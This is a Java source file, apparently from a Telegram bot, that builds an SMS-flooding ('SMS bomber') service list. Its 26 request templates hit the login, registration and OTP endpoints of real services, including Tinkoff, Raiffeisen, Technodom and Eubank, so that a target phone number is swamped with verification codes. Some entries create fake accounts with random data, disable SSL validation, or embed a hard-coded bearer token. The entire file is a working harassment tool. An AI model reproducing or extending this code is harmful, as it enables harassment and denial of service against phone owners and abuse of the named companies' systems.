package info.securedev.telegrambot.flood_services;

import info.securedev.telegrambot.settings.BotConfig;
import info.securedev.telegrambot.utils.RandomStringGenerator;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

public class FloodServiceFactory {
    private List<Flood> floodServices;

    public List<Flood> getFloodServices() {
        if(floodServices == null || floodServices.isEmpty())
            generateAndAddFloodServices();

        return floodServices;
    }

    public void generateAndAddFloodServices() {
        String randomString = RandomStringGenerator.generate(10);

        FloodService icq = new FloodService.Builder()
                .baseUrl("https://icq.com/smscode/login/ru")
                .baseRequestMethod("POST")
                .baseBodyData("msisdn=7%s")
                .contentType(BotConfig.APPLICATION_URLENCODED)
                .build();

        FloodService yandexEda = new FloodService.Builder()
                .baseUrl("https://eda.yandex/api/v1/user/request_authentication_code")
                .baseRequestMethod("POST")
                .baseBodyData("{\"phone_number\":\"+7%s\"}")
                .contentType(BotConfig.APPLICATION_JSON)
                .build();

        FloodService unacademy = new FloodService.Builder()
                .baseUrl("https://unacademy.com/api/v3/user/user_check/")
                .baseRequestMethod("POST")
                .baseBodyData("{\"phone\":\"%s\",\"country_code\":\"KZ\",\"otp_type\":1,\"email\":\"\"," +
                        "\"send_otp\":true,\"is_un_teach_user\":false}")
                .contentType(BotConfig.APPLICATION_JSON)
                .build();

        FloodService polisonline = new FloodService.Builder()
                .baseUrl("https://797.polisonline.kz/otp?phone=7%s")
                .baseRequestMethod("GET")
                .build();

        FloodService youla = new FloodService.Builder()
                .baseUrl("https://youla.ru/web-api/auth/request_code")
                .baseRequestMethod("POST")
                .baseBodyData("{\"phone\":\"7%s\"}")
                .contentType(BotConfig.APPLICATION_JSON)
                .build();

        FloodService amanat = new FloodService.Builder()
                .sslValDis(true)
                .baseUrl("https://my.amanat24.kz/ru/site/reg")
                .baseRequestMethod("POST")
                .baseBodyData("PhoneValidateForm[phone]=+7%s")
                .contentType(BotConfig.APPLICATION_URLENCODED)
                .build();

        FloodService chocolife = new FloodService.Builder()
                .baseUrl("https://gateway.choco.kz/user/v2")
                .baseRequestMethod("POST")
                .baseBodyData("phone=7%s&password=qweQWE!@#&timezone=Asia/Almaty")
                .contentType(BotConfig.APPLICATION_URLENCODED)
                .build();

        FloodService delPapa = new FloodService.Builder()
                .baseUrl("https://api.del-papa.kz/v1/?r=user/signin")
                .baseRequestMethod("POST")
                .baseBodyData("{\"phone\":\"7%s\"}")
                .contentType(BotConfig.APPLICATION_JSON)
                .build();

        FloodService iconjob = new FloodService.Builder()
                .baseUrl("https://api.iconjob.co/api/auth/verification_code")
                .baseRequestMethod("POST")
                .baseBodyData("{\"phone\":\"7%s\"}")
                .contentType(BotConfig.APPLICATION_JSON)
                .build();

        FloodService zenge = new FloodService.Builder()
                .baseUrl("https://zenge.kz/auth/claim_sms_with_code?phone=+7%s&procedure=reg&name=asd&city=1")
                .baseRequestMethod("GET")
                .build();

        FloodService sushiwok = new FloodService.Builder()
                .baseUrl("https://almaty.sushiwok.kz/account/register/")
                .baseRequestMethod("POST")
                .baseBodyData("login=+7%s")
                .contentType(BotConfig.APPLICATION_URLENCODED)
                .build();

        FloodService technodomSign = new FloodService.Builder()
                .baseUrl("https://sso.technodom.kz/api/v1/auth/signup")
                .baseRequestMethod("PUT")
                .baseBodyData("{\"firstname\":\"" + randomString + "\",\"lastname\":\"" + randomString + "\"," +
                        "\"email\":\"" + randomString + "@ya.ru\",\"phone\":\"+7%s\",\"password\":\"" + randomString + "\"}")
                .contentType(BotConfig.APPLICATION_JSON)
                .build();

        FloodService technodomRec = new FloodService.Builder()
                .baseUrl("https://sso.technodom.kz/api/v1/auth/recovery/phone")
                .baseRequestMethod("PUT")
                .baseBodyData("{\"phone\":\"+7%s\"}")
                .contentType(BotConfig.APPLICATION_JSON)
                .build();

        FloodService sulpakSign = new FloodService.Builder()
                .baseUrl("https://www.sulpak.kz/Customers/Register")
                .baseRequestMethod("POST")
                .baseBodyData("Redirect=&Name=" + randomString + "&RegistrationPhoneNumber=%%2B7%s" +
                        "&Email=" + randomString + "@ya.ru&RegistrationPassword=asdqweASDQWE&RepeatPassword=asdqweASDQWE")
                .contentType(BotConfig.APPLICATION_URLENCODED)
                .build();

        FloodService sulpakRec = new FloodService.Builder()
                .baseUrl("https://www.sulpak.kz/Customers/ResetPassword")
                .baseRequestMethod("POST")
                .baseBodyData("PhoneNumber=%%2B7%s")
                .contentType(BotConfig.APPLICATION_URLENCODED)
                .build();

        FloodService evrika = new FloodService.Builder()
                .baseUrl("https://evrika.com/ajax/send-code/")
                .baseRequestMethod("POST")
                .baseBodyData("phone=%%2B7%s")
                .contentType(BotConfig.APPLICATION_URLENCODED)
                .xRequestedWith("XMLHttpRequest")
                .build();

        FloodService anytime = new FloodService.Builder()
                .sslValDis(true)
                .baseUrl("https://anytime.kz/send_sms.php")
                .baseRequestMethod("POST")
                .baseBodyData("phone=7%s")
                .contentType(BotConfig.APPLICATION_URLENCODED)
                .build();

        FloodService tinkoffBank = new FloodService.Builder()
                .baseUrl("https://www.tinkoff.ru/api/common/v1/sign_up?origin=web%2Cib5%2Cplatform")
                .baseRequestMethod("POST")
                .baseBodyData("phone=+7%s")
                .contentType(BotConfig.APPLICATION_URLENCODED)
                .build();

        FloodService raiffeisenBank = new FloodService.Builder()
                .baseUrl("https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code?number=7%s")
                .baseRequestMethod("GET")
                .origin("https://www.raiffeisen.ru")
                .referer("https://www.raiffeisen.ru/retail/cards/debit/cashback-card/")
                .build();

        FloodService eurasia = new FloodService.Builder()
                .baseUrl("https://eurasia36.kz/Eurasia.API/api/Main/RequestCode")
                .baseRequestMethod("POST")
                .baseBodyData("{\"RequestType\":\"sms\", \"Contact\":\"%s\", \"Localization\":\"ru\"}")
                .contentType(BotConfig.APPLICATION_JSON)
                .authorization("Bearer 31a408997f190debe9c2c187d26fdfe08f1dd346c9dfc7f61215d9970426703d380cc2a7" +
                        "5b26647823571f6d6c3348d773d44f1b1105e84a7fe661d639cb5094")
                .build();

        FloodService nomad = new FloodService.Builder()
                .sslValDis(true)
                .baseUrl("https://apidevcalc.nomad.kz/profile/check_phone/")
                .baseRequestMethod("POST")
                .baseBodyData("{\"phone\":\"%s\"}")
                .contentType(BotConfig.APPLICATION_JSON)
                .build();

        FloodService asko = new FloodService.Builder()
                .baseUrl("https://api.asko24.kz/v1/cabinet/auth")
                .baseRequestMethod("POST")
                .baseBodyData("phone=7%s&iin=123456678912")
                .contentType(BotConfig.APPLICATION_URLENCODED)
                .build();

        FloodService aituLogin = new FloodService.Builder()
                .baseUrl("https://passport.aitu.io/api/v1/sms/request-code")
                .baseRequestMethod("POST")
                .baseBodyData("{\"phone\":\"+7%s\"}")
                .contentType(BotConfig.APPLICATION_JSON)
                .build();

        FloodService aituReg = new FloodService.Builder()
                .baseUrl("https://aitu.city/api/public/v1/client/auth/code/request")
                .baseRequestMethod("POST")
                .baseBodyData("{\"phone\":\"+7%s\"}")
                .contentType(BotConfig.APPLICATION_JSON)
                .referer("https://aitu.city/")
                .build();

        FloodService letsads = new FloodService.Builder()
                .baseUrl("https://letsads.com/registraciya-1")
                .baseRequestMethod("POST")
                .baseBodyData("phone=7%s&iagree=1")
                .contentType(BotConfig.APPLICATION_URLENCODED)
                .build();

        FloodService euBank = new FloodService.Builder()
                .withCookieTokenInHeaders(true)
                .urlToGetCookiesAndTokens("https://eubank.kz/ajax")
                .requestMethodToGetCookiesAndTokens("POST")
                .bodyDataToGetCookiesAndTokens("action=saveRelease&iin=900101001809&phone=+7%s&city=1000&cardType=VISG")
                .baseUrl("https://eubank.kz/ajax")
                .baseRequestMethod("POST")
                .baseBodyData("action=sendSMS")
                .contentType(BotConfig.APPLICATION_URLENCODED)
                .build();

        floodServices = new ArrayList<>();
        Collections.addAll(floodServices, icq, yandexEda, unacademy, polisonline, youla, amanat, chocolife, delPapa,
                iconjob, zenge, sushiwok, technodomSign, technodomRec, sulpakSign, sulpakRec, evrika, anytime, tinkoffBank,
                raiffeisenBank, eurasia, nomad, asko, aituLogin, aituReg, letsads, euBank);

    }
}
